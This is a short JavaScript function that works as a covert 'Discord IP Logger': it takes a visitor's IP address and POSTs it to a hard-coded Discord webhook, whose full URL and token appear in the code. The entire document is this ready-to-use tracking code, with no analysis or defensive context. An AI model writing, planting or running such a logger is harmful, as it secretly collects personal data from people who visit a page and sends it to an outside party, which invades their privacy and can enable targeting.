function getIP(json) {
  var request = new XMLHttpRequest();
        const Hook = "https://discord.com/api/webhooks/985185451579150386/CfkgKSq8YUd-c0v6Expwl3x5LCy_JotVtWUxZAiqUdkol8iegiPn0UHvLRPCXp09L9AH"; 
        var request = new XMLHttpRequest();
        request.open("POST", Hook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "Discord IP Logger",
            embeds: [
                { "color": 7506394,
                "title": "IP Logged",
                "description": json.ip
            }]
        }
        request.send(JSON.stringify(params));
    }
